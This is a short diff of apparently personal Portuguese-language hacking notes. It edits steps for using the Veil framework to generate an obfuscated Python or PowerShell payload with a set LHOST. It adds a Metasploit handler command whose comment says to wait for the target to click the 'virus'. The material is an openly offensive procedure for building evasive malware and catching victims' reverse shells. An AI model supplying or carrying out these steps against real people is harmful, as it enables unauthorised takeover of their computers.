@@ -380,8 +380,10 @@ Metasploit - Armitage
 VEIL
   apt install veil
   veil
-  1
-  use 28
+  use 1
+  list
+  use 28 -> python
+  use 22 -> powershell
   set LHOST 192.168.100.71
   set USE_PYHERION Y
   otions
@@ -389,6 +391,7 @@ VEIL
   coloca o nome do arquivo 
   2
   /var/lib/veil/output/source -> arquivo criado fica aqui
+  msfconsole -r /var/lib/veil/output/handlers/power.rc -> deixar aguardando o alvo clicar no virus
   
 
 Baixar paginas e projetos web
